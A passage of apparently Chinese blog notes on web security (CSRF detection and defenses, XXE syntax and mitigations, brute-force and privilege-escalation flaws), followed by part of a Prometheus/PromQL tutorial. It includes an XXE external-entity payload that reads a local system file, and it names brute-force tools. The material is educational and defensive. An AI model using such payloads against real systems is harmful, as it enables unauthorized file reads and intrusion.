<p>2、如果有Referer字段，但是去掉Referer字段后再重新提交，如果该提交还有效，那么基本上可以确定存在CSRF漏洞。</p>
<p>3、随着对CSRF漏洞研究的不断深入，不断涌现出一些专门针对CSRF漏洞进行检测的工具，如CSRFTester，CSRF Request Builder等。以CSRFTester工具为例，CSRF漏洞检测工具的测试原理如下:</p>
<p>使用CSRFTester进行测试时，首先需要抓取我们在浏览器中访问过的所有链接以及所有的表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这相当于一次伪造客户端请求。</p>
<p>如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞，当然此款工具也可以被用来进行CSRF攻击。</p>
<h2 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h2><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>CSRF攻击的过程，往往是在用户不知情的情况下构造了网络请求。而验证码，则强制用户必须与应用进行交互，才能完成最终请求。因此在通常情况下，验证码能够很好地遏制CSRF攻击。</p>
<h3 id="在请求地址中添加-token-并验证"><a href="#在请求地址中添加-token-并验证" class="headerlink" title="在请求地址中添加 token 并验证"></a>在请求地址中添加 token 并验证</h3><p>可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。</p>
<h3 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h3><p>Referer字段用来记录该HTTP请求的来源地址。</p>
<ul>
<li>验证referer通过———&gt;合法请求</li>
<li>验证referer不通过———&gt;不合法请求</li>
</ul>
<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="XXE介绍"><a href="#XXE介绍" class="headerlink" title="XXE介绍"></a>XXE介绍</h2><p>XML被称为可扩展标记语⾔，与HTML类似，但是HTML中的标签都是预定义(预先定义好每个标签的作⽤)的，⽽XML语⾔中的标签都是⾃定义(可以⾃⼰定义标签的名称、属性、值、作⽤)的；HTML中的标签可以是单标</p>
<p>签，⽽XML中的标签必须是成对出现。</p>
<p>​	HTML语⾔主要⽤来展示内容，⽽XML语⾔⽤来传输数据。</p>
<h3 id="XML语法"><a href="#XML语法" class="headerlink" title="XML语法"></a>XML语法</h3><p>语法规则</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">XML语⾔严格区分⼤⼩写，⽽HTML语⾔不区分⼤⼩写;</span><br><span class="line">XML语⾔只能有⼀个根标签;</span><br><span class="line">HTML语⾔中的属性值可以不⽤引号引起来，但是XML语⾔中的属性值必须⽤引号引起来；</span><br><span class="line">XML中的标签必须成对出现;</span><br><span class="line"> HTML：</span><br><span class="line"> &lt;img 属性=&quot;属性的值&quot;&gt;</span><br><span class="line"> XML：</span><br><span class="line"> &lt;security&gt;&lt;/security&gt;</span><br><span class="line">XML会对特殊字符进⾏实体转义，需要转义的字符如下：</span><br><span class="line">标签之间不能交叉编写;</span><br></pre></td></tr></table></figure>

<img src="/img/oldboy/image-20250312135416815.png" alt="image-20250312135416815" style="zoom: 25\%;" />

<p>文档结构</p>
<p>​	XML文档有xml声明、DTD文档类型、文档元素三部分组成。</p>
<h4 id="XML文档声明"><a href="#XML文档声明" class="headerlink" title="XML文档声明"></a>XML文档声明</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ecoding=&quot;utf-8&quot; ?&gt; </span><br><span class="line">&lt;!-- 声明部分可有可无，但是建议写上--&gt;</span><br></pre></td></tr></table></figure>

<h4 id="DTD文档类型"><a href="#DTD文档类型" class="headerlink" title="DTD文档类型"></a>DTD文档类型</h4><h5 id="DTD文档中的关键字"><a href="#DTD文档中的关键字" class="headerlink" title="DTD文档中的关键字"></a>DTD文档中的关键字</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">DOCTYPE（DTD的声明）</span><br><span class="line">ENTITY（实体的声明）</span><br><span class="line">ELEMENT（定义元素）</span><br><span class="line">SYSTEM、PUBLIC（外部资源申请）</span><br></pre></td></tr></table></figure>



<p>XML文档元素</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;urf-8&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE security [</span><br><span class="line">	&lt;?ELEMENT security (network,OS,websec,LAN)&gt;]&gt;</span><br><span class="line">&lt;security&gt;</span><br><span class="line">	&lt;network&gt;1&lt;/network&gt;</span><br><span class="line">	&lt;OS&gt;1&lt;/OS&gt;</span><br><span class="line">	&lt;websec&gt;web&lt;/websec&gt;</span><br><span class="line">    &lt;LAN&gt;lan&lt;/LAN&gt;</span><br><span class="line">&lt;/security&gt;</span><br></pre></td></tr></table></figure>





<h4 id="DTD声明类型"><a href="#DTD声明类型" class="headerlink" title="DTD声明类型"></a>DTD声明类型</h4><h5 id="内部声明"><a href="#内部声明" class="headerlink" title="内部声明"></a>内部声明</h5><p>语法格式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;?DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>案例如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE security [</span><br><span class="line">	&lt;!ELEMENT security (network,OS,websec,LAN)&gt;</span><br><span class="line"><span class="meta prompt_">]&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="外部声明"><a href="#外部声明" class="headerlink" title="外部声明"></a>外部声明</h5><p>语法格式</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;外部⽂件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>案例如下</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///C:/windows/system.ini&quot;&gt;</span><br><span class="line"><span class="meta prompt_">]&gt;</span></span><br></pre></td></tr></table></figure>



<h5 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h5><p>参数实体⽤“% 实体名称”声明，引⽤时也⽤“% 实体名称”；其余实体直接⽤实体名称声明，引⽤时⽤“&amp;实体名称;”。参数实体只能在DTD中声明，DTD中引⽤；其余实体只能在DTD中声明，可以在XML⽂档中引⽤。所谓的实体就是预先定义好的数据或者数据的集合。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">内部实体：&lt;!ENTITY 实体名称 “实体的值”&gt;</span><br><span class="line">外部实体：&lt;!ENTITY 实体名称 SYSTEM “URL”&gt;</span><br><span class="line">参数实体：&lt;!ENTITY \% 实体名称 “实体的值”&gt;或者&lt;!ENTITY \% 实体名称 SYSTEM “URL” &gt;</span><br></pre></td></tr></table></figure>



<h2 id="漏洞基础"><a href="#漏洞基础" class="headerlink" title="漏洞基础"></a>漏洞基础</h2><p>1、漏洞形成原因</p>
<p>XXE被称为外部实体注⼊漏洞。XXE漏洞的形成主要是程序在解析XML⽂档输⼊时，没有禁⽌外部实体的加载，导致可加载外部的恶意⽂件，造成⽂件读取、命令执⾏、内⽹端⼝扫描、攻击内⽹⽹站。</p>
<p>2、支持的伪协议</p>
<p><img src="/img/oldboy/image-20250312141105892.png" alt="image-20250312141105892"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file:⽤来加载本地⽂件</span><br><span class="line">http:⽤来加载远程⽂件</span><br><span class="line">ftp:⽤来访问ftp服务器上的⽂件</span><br><span class="line">php:⽤来读取php源码,php://filter</span><br></pre></td></tr></table></figure>



<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><ol>
<li>探测内网端口</li>
<li>攻击内网网站</li>
<li>任意读取本地文件&#x2F;远程读取文件</li>
<li>读取PHP源码</li>
</ol>
<h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><p>1、经用是外部实体</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PHP：libxml_disable_entity_loader(true);</span><br><span class="line">java:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line">python:</span><br><span class="line">rom lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>

<p>2、过滤</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">预定义字符转义：&lt; &amp;lt; &gt; &amp;gt; &amp; &amp;amp; ‘ &amp;apos; “ &amp;quot;</span><br><span class="line">过滤⽤户提交的XML数据，关键词：SYSTEM和PUBLIC</span><br><span class="line">禁⽤外部实体：libxml_disable_entity_loader(true);</span><br></pre></td></tr></table></figure>











<h1 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h1><h2 id="漏洞介绍-3"><a href="#漏洞介绍-3" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>暴力破解：实际上就是使用枚举方法，将密码逐个进行猜解，获取真正密码。</p>
<h3 id="C-S架构破解"><a href="#C-S架构破解" class="headerlink" title="C&#x2F;S架构破解"></a>C&#x2F;S架构破解</h3><p> C&#x2F;S即客户端&#x2F;服务器,基于C&#x2F;S架构的应用程序 如 ssh ftp sql-server mysql 等，这些服务往往提供一个高权限的用户，而这个高权限的用户往往可以进行执行命令的操作，如 sql-server 的 sa ，mysql的root，oracle的sys和system帐号，使用这些高权限的用户能在很大程度上给开发人员带来方便，但如果口令被破解带来的危害也是相当大的。</p>
<p>C&#x2F;S架构主要使用的破解工具 <strong>Hydra、Bruter、X-scan</strong></p>
<h3 id="B-S架构破解"><a href="#B-S架构破解" class="headerlink" title="B&#x2F;S架构破解"></a>B&#x2F;S架构破解</h3><p>一般是对web应用程序中的高权限用户进行猜解，如网站的内容管理系统账户。一般针对 B&#x2F;S的暴力猜解，使用Burp Suit 镜像表单爆破。</p>
<p>API接口暴力猜解参考   <a href="https://xz.aliyun.com/t/6330">https://xz.aliyun.com/t/6330</a></p>
<p><strong>破解方法</strong></p>
<ul>
<li><p><strong>基于表单的暴力破解</strong></p>
<p>直接使用暴力破解工具即可</p>
</li>
<li><p><strong>基于验证码的暴力破解</strong></p>
<ul>
<li>on client常见问题<ul>
<li>在前端进行验证码验证；不安全的将验证码泄露在cookie中；不安全的将验证码在前端源代码中泄露</li>
</ul>
</li>
<li>on server常见问题<ul>
<li>验证码在后台不过期，导致长时间使用（php默认session时间为24分钟）；验证码校验不严格，逻辑出现问题；验证码过于简单</li>
</ul>
</li>
<li>弱特证码识别攻击</li>
</ul>
</li>
<li><p><strong>基于token破解</strong></p>
<p>由于token值输出在前端源代码中，容易被获取，因此也就失去了防暴力破解的意义，一般Token在防止CSRF上会有比较好的功效。</p>
</li>
</ul>
<h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p><strong>查找漏洞前注意事项</strong></p>
<ol>
<li>首先需要一个有效的字典（如top10常用密码字典）</li>
<li>判断暴力破解的页面的密码复杂度</li>
<li>网站是否存在验证码</li>
<li>是否对登录行为有限制</li>
<li>是否有token，双因素等验证信息</li>
</ol>
<p><strong>登录页面可能产生的漏洞</strong></p>
<img src="/img/oldboy/image-20250315215838059.png" alt="image-20250315215838059" style="zoom: 65\%;" />



<h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><ol>
<li>强制要求输入验证码，否则，必须实施IP策略。 注意不要被X-Forwaded-For绕过了！</li>
<li>验证码只能用一次，用完立即过期！不能再次使用</li>
<li>验证码不要太弱。扭曲、变形、干扰线条、干扰背景色、变换字体等。</li>
<li>大网站最好统一安全验证码，各处使用同一个验证码接口。</li>
</ol>
<h1 id="越权与逻辑漏洞"><a href="#越权与逻辑漏洞" class="headerlink" title="越权与逻辑漏洞"></a>越权与逻辑漏洞</h1><h2 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h2><h3 id="越权基础"><a href="#越权基础" class="headerlink" title="越权基础"></a>越权基础</h3><p>如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称为越权操作</p>
<p>形成原因：后台使用了不合理的权限校验规则导致的（没有验证session会话信息&#x2F;验证权限）。</p>
<p><strong>权限分类</strong></p>
<p>平行越权:</p>
<p>​	A用户和B用户属于同一级别的用户，但各自不能操作对方的个人信息，A用户如果可以操作B用户的个人信息的情况称为水平越权。</p>
<p>​	简而言之：可以对相同权限的用户进行操作。</p>
<p>​	防御方法：可以使用session会话来进行校验是否为同一用户操作。</p>
<p>垂直越权：</p>
<p>​	A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。</p>
<p>​	简而言之：对比自己权限高的用户进行操作。</p>
<p>​	防御方法：对用户权限和身份信息进行校验。</p>
<h3 id="越权发现"><a href="#越权发现" class="headerlink" title="越权发现"></a>越权发现</h3><p>一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。</p>
<h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2><h3 id="漏洞发现-1"><a href="#漏洞发现-1" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p><a href="https://mp.weixin.qq.com/s?__biz=MzU1NzgyMzA0OA==&mid=2247487316&idx=1&sn=a26a2a40ebade542c94b6a0c00d30f9a&chksm=fc2eaa73cb592365bab11302efc94e86a024fc73e6aee8a09be693432e25b7ff40be46dcb714&mpshare=1&srcid=0307h5NtXaku1riA6ObM2e1l&sharer_sharetime=1646647976027&sharer_shareid=9dabdbed893bcfec2f742c97df072b91&from=singlemessage&scene=1&subscene=10000&clicktime=1646705651&enterid=1646705651#rd">支付逻辑漏洞思路小集合</a></p>
<p><img src="/img/oldboy/image-20250316171220849.png" alt="image-20250316171220849"></p>
<p>确定业务流程—&gt;寻找流程中可以被操控的环节—&gt;分析可被操控环节中可能产生的逻辑问题—&gt;尝试修改参数触发逻辑问题</p>
]]></content>
      <categories>
        <category>网络安全</category>
        <category>老男孩安全</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>老男孩安全</tag>
      </tags>
  </entry>
  <entry>
    <title>云计算方向-Prometheus入门到实战</title>
    <url>/posts/8a9c0b3b.html</url>
    <content><![CDATA[<h1 id="prometheus知识大全"><a href="#prometheus知识大全" class="headerlink" title="prometheus知识大全"></a>prometheus知识大全</h1><h2 id="一-Prometheus安装"><a href="#一-Prometheus安装" class="headerlink" title="一.Prometheus安装"></a>一.Prometheus安装</h2><h3 id="1-prometheus安装"><a href="#1-prometheus安装" class="headerlink" title="1.prometheus安装"></a>1.prometheus安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">https://github.com/prometheus-operator/kube-prometheus.git</span><br><span class="line">git checkout release-0.5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">或者下载压缩包上传至root</span></span><br><span class="line">https://github.com/prometheus-operator/kube-prometheus/tree/release-0.5</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">部署</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1.安装operator</span></span><br><span class="line">cd manifests/setup &amp;&amp; kubectl create -f .</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">安装Prometheus</span></span><br><span class="line">cd .. &amp;&amp; kubectl create -f .</span><br></pre></td></tr></table></figure>

<h3 id="2更改svc的port类型"><a href="#2更改svc的port类型" class="headerlink" title="2更改svc的port类型"></a>2更改svc的port类型</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">kubectl edit svc 【svc-name】 -n monitoring</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将 <span class="built_in">type</span>: ClusterIP 修改为 <span class="built_in">type</span>: NodePort，然后保存退出</span></span><br><span class="line"> 需要修改的svc有：</span><br><span class="line">    alertmanager-main </span><br><span class="line">    grafana</span><br><span class="line">    prometheus-k8s</span><br></pre></td></tr></table></figure>

<h2 id="二-知识"><a href="#二-知识" class="headerlink" title="二.知识"></a>二.知识</h2><p><img src="C:\Users\user\AppData\Roaming\Typora\typora-user-images\image-20220909170637739.png" alt="image-20220909170637739"></p>
<h3 id="1-Metrics数据类型"><a href="#1-Metrics数据类型" class="headerlink" title="1.Metrics数据类型"></a>1.Metrics数据类型</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">counter：只增不减的计数器</span><br><span class="line"></span><br><span class="line">​         例：http_requests_total </span><br><span class="line"></span><br><span class="line">​        	 node_cpu</span><br><span class="line"></span><br><span class="line">Gauge：可增可减</span><br><span class="line"></span><br><span class="line">​          例：主机的cpu、内存、磁盘使用率</span><br><span class="line"></span><br><span class="line">​		  		当前的并发量</span><br><span class="line"></span><br><span class="line">Histogram和Summary： 用于统计和分析样本的分布情况：</span><br><span class="line">Histogram是一种只增直方图，每一个bucket样本包含了之前所有样本</span><br><span class="line">Summary这类指标是根据样本计算出百分位的，是在客户端计算好的然后被抓取到promethues中的</span><br></pre></td></tr></table></figure>

<h3 id="2-promSQL"><a href="#2-promSQL" class="headerlink" title="2.promSQL"></a>2.promSQL</h3><h4 id="①瞬时向量和区间向量"><a href="#①瞬时向量和区间向量" class="headerlink" title="①瞬时向量和区间向量"></a>①瞬时向量和区间向量</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">瞬时向量：包含该时间序列最新的一个样本值</span><br><span class="line">node_cpu_seconds_total&#123;cpu=&quot;0&quot;,endpoint=&quot;https&quot;,instance=&quot;master&quot;,job=&quot;node-exporter&quot;,mode=&quot;idle&quot;,namespace=&quot;monitoring&quot;,pod=&quot;node-exporter-45l68&quot;,service=&quot;node-exporter&quot;&#125;</span><br><span class="line">区间向量（带时间戳）：一段时间范围内的数据</span><br><span class="line">http_request_total&#123;endpoint=&quot;http&quot;,handler=&quot;/*&quot;,instance=&quot;10.244.1.35:3000&quot;,job=&quot;grafana&quot;,method=&quot;get&quot;,namespace=&quot;monitoring&quot;,pod=&quot;grafana-5c55845445-gb8dd&quot;,service=&quot;grafana&quot;,statuscode=&quot;200&quot;&#125;[5m]</span><br><span class="line"><span class="meta prompt_">  #</span><span class="language-bash">Offset：查看多少分钟之前的数据 offset 30m</span></span><br><span class="line">  http_request_total&#123;endpoint=&quot;http&quot;,handler=&quot;/*&quot;,instance=&quot;10.244.1.35:3000&quot;,job=&quot;grafana&quot;,method=&quot;get&quot;,namespace=&quot;monitoring&quot;,pod=&quot;grafana-5c55845445-gb8dd&quot;,service=&quot;grafana&quot;,statuscode=&quot;200&quot;&#125;[5m] offset 30s</span><br></pre></td></tr></table></figure>

<h4 id="②Labelsets"><a href="#②Labelsets" class="headerlink" title="②Labelsets:"></a>②<strong>Labelsets:</strong></h4><p><strong>过略出具有某一个标签的label数据。</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">正则匹配：http_request_total&#123;handler=~&quot;.*login.*&quot;&#125;</span><br><span class="line">剔除某个label：http_request_total&#123;handler!~&quot;.*login.*&quot;&#125;</span><br><span class="line">匹配两个值：http_request_total&#123;handler=~&quot;/login|/password&quot;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="③数学运算"><a href="#③数学运算" class="headerlink" title="③数学运算"></a>③数学运算</h4><p><strong>+ - * &#x2F; % ^</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看主机内存总大小（Mi）</span><br><span class="line">node_memory_MemTotal_bytes / 1024 /1024</span><br></pre></td></tr></table></figure>

<h4 id="④集合运算"><a href="#④集合运算" class="headerlink" title="④集合运算"></a>④集合运算</h4><p><strong>and</strong>，<strong>or</strong>，<strong>unless(剔除)</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node_memory_MemTotal_bytes / 1024 /1024 &lt;= 2772  or node_memory_MemTotal_bytes / 1024 /1024 == 	3758.59765625</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">unless</span></span><br><span class="line">node_memory_MemTotal_bytes / 1024 /1024 &gt;= 2772  unless node_memory_MemTotal_bytes / 1024 /1024 == 	3758.59765625</span><br></pre></td></tr></table></figure>

<p><strong>优先级</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">^ </span><br><span class="line">* / %</span><br><span class="line">+ -</span><br><span class="line">==, !=, &lt;=, &lt; &gt;= &gt;</span><br><span class="line">And unless</span><br><span class="line">Or</span><br></pre></td></tr></table></figure>

<h4 id="⑤聚合操作"><a href="#⑤聚合操作" class="headerlink" title="⑤聚合操作"></a>⑤聚合操作</h4><p><strong>sum，max，avg，stddev(标准差)，stdvar(标准差异)，count(计数)，topk(取前n条时序)，bottomk(取后n条时序)，quantile(取数据的某一段)</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">求和</span></span><br><span class="line">sum(node_memory_MemTotal_bytes) / 1024^2</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">根据某个字段进行统计</span></span><br><span class="line">sum(http_request_total)  by (statuscode, handler)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">最小值</span></span><br><span class="line">min(node_memory_MemTotal_bytes)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">平均值</span></span><br><span class="line">avg(node_memory_MemTotal_bytes)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">计数</span> </span><br><span class="line">count(http_request_total)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">对value进行统计计数</span></span><br><span class="line">count_values(&quot;count&quot;, node_memory_MemTotal_bytes)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">取前5条时序</span></span><br><span class="line">topk(5, sum(http_request_total)  by (statuscode, handler))</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">取后五条时序</span></span><br><span class="line">bottomk(3, sum(http_request_total)  by (statuscode, handler))</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">取当前数据的中位数</span></span><br><span class="line">quantile(0.5, http_request_total)</span><br></pre></td></tr></table></figure>

<h4 id="⑥内置函数"><a href="#⑥内置函数" class="headerlink" title="⑥内置函数"></a>⑥内置函数</h4><p><strong>increase，rate，irate(一个指标的增长率)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">两分钟内的平均CPU使用率：</span><br><span class="line">rate(node_cpu[2m])和irate(node_cpu[2m])</span><br><span class="line"> </span><br><span class="line">需要注意的是使用rate或者increase函数去计算样本的平均增长速率，容易陷入“长尾问题”当中，其无法反应在时间窗口内样本数据的突发变化。 </span><br><span class="line">例如，对于主机而言在2分钟的时间窗口内，可能在某一个由于访问量或者其它问题导致CPU占用100%的情况，但是通过计算在时间窗口内的平均增长率却无法反应出该问题。为了解决该问题，PromQL提供了另外一个灵敏度更高的函数irate(v range-vector)。</span><br><span class="line">irate同样用于计算区间向量的计算率，但是其反应出的是瞬时增长率。</span><br><span class="line">irate函数是通过区间向量中最后两个两本数据来计算区间向量的增长速率。</span><br><span class="line">这种方式可以避免在时间窗口范围内的“长尾问题”，并且体现出更好的灵敏度，通过irate函数绘制的图标能够更好的反应样本数据的瞬时变化状态。</span><br></pre></td></tr></table></figure>

<p><strong>predict_linear()预测</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#根据一天的数据，预测4个小时之后，磁盘分区的空间会不会小于0</span><br><span class="line">predict_linear(node_filesystem_files_free&#123;mountpoint=&quot;/&quot;&#125;[1d], 4*3600) &lt; 0</span><br></pre></td></tr></table></figure>

<p>**absent()**：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果样本数据不为空则返回no data，如果为空则返回1。判断数据是否在正常采集。</span><br></pre></td></tr></table></figure>

<p><strong>去除小数点</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ceil()：四舍五入，向上取最接近的整数，2.79 -&gt; 3</span><br><span class="line"></span><br><span class="line">​	Floor：向下取， 2.79 -&gt; 2</span><br></pre></td></tr></table></figure>

<p>**Delta()**：差值</p>
<p><strong>排序</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	Sort：正序</span><br><span class="line"></span><br><span class="line">​	Sort_desc：倒叙</span><br></pre></td></tr></table></figure>

<p>**Label_join()**将数据中的一个或多个label的值赋值给一个新label</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label_join(node_filesystem_files_free, &quot;new_label&quot;, &quot;,&quot;,  &quot;instance&quot;, &quot;mountpoint&quot;)</span><br></pre></td></tr></table></figure>

<p><strong>label_replace</strong>：根据数据中的某个label值，进行正则匹配，然后赋值给新label并添加到数据中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label_replace(node_filesystem_files_free, &quot;host&quot;,&quot;$2&quot;, &quot;instance&quot;, &quot;(.*)-(.*)&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="3-白盒监控"><a href="#3-白盒监控" class="headerlink" title="3.白盒监控"></a>3.白盒监控</h3><p> 监控一些内部数据，topic的监控数据，redis key的大小，内部暴露的指标</p>
<p>关注的是原因</p>
<h3 id="4-黑盒监控"><a href="#4-黑盒监控" class="headerlink" title="4.黑盒监控"></a>4.黑盒监控</h3><p>站在用户的角度看到的东西。网站打不开，网站延迟</p>
<p>关注的是现象，表示正在发生的问题</p>
<h4 id="①部署"><a href="#①部署" class="headerlink" title="①部署"></a>①部署</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">https://github.com/prometheus/blackbox_exporter</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#部署configmap</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">data:</span></span><br><span class="line">  <span class="attr">blackbox.yml:</span> <span class="string">|-</span></span><br><span class="line"><span class="string">    modules:</span></span><br><span class="line"><span class="string">      http_2xx:</span></span><br><span class="line"><span class="string">        prober: http</span></span><br><span class="line"><span class="string">        http:</span></span><br><span class="line"><span class="string">          preferred_ip_protocol: &quot;ip4&quot;</span></span><br><span class="line"><span class="string">      http_post_2xx:</span></span><br><span class="line"><span class="string">        prober: http</span></span><br><span class="line"><span class="string">        http:</span></span><br><span class="line"><span class="string">          method: POST</span></span><br><span class="line"><span class="string">      tcp_connect:</span></span><br><span class="line"><span class="string">        prober: tcp</span></span><br><span class="line"><span class="string">      pop3s_banner:</span></span><br><span class="line"><span class="string">        prober: tcp</span></span><br><span class="line"><span class="string">        tcp:</span></span><br><span class="line"><span class="string">          query_response:</span></span><br><span class="line"><span class="string">          - expect: &quot;^+OK&quot;</span></span><br><span class="line"><span class="string">          tls: true</span></span><br><span class="line"><span class="string">          tls_config:</span></span><br><span class="line"><span class="string">            insecure_skip_verify: false</span></span><br><span class="line"><span class="string">      ssh_banner:</span></span><br><span class="line"><span class="string">        prober: tcp</span></span><br><span class="line"><span class="string">        tcp:</span></span><br><span class="line"><span class="string">          query_response:</span></span><br><span class="line"><span class="string">          - expect: &quot;^SSH-2.0-&quot;</span></span><br><span class="line"><span class="string">      irc_banner:</span></span><br><span class="line"><span class="string">        prober: tcp</span></span><br><span class="line"><span class="string">        tcp:</span></span><br><span class="line"><span class="string">          query_response:</span></span><br><span class="line"><span class="string">          - send: &quot;NICK prober&quot;</span></span><br><span class="line"><span class="string">          - send: &quot;USER prober prober prober :prober&quot;</span></span><br><span class="line"><span class="string">          - expect: &quot;PING :([^ ]+)&quot;</span></span><br><span class="line"><span class="string">            send: &quot;PONG $&#123;1&#125;&quot;</span></span><br><span class="line"><span class="string">          - expect: &quot;^:[^ ]+ 001&quot;</span></span><br><span class="line"><span class="string">      icmp:</span></span><br><span class="line"><span class="string">        prober: icmp</span></span><br><span class="line"><span class="string"></span><span class="attr">kind:</span> <span class="string">ConfigMap</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="string">&quot;2020-05-13T13:44:52Z&quot;</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">blackbox-conf</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">monitoring</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#部署Deployment</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">generation:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">blackbox-exporter</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">blackbox-exporter</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">monitoring</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">blackbox-exporter</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span 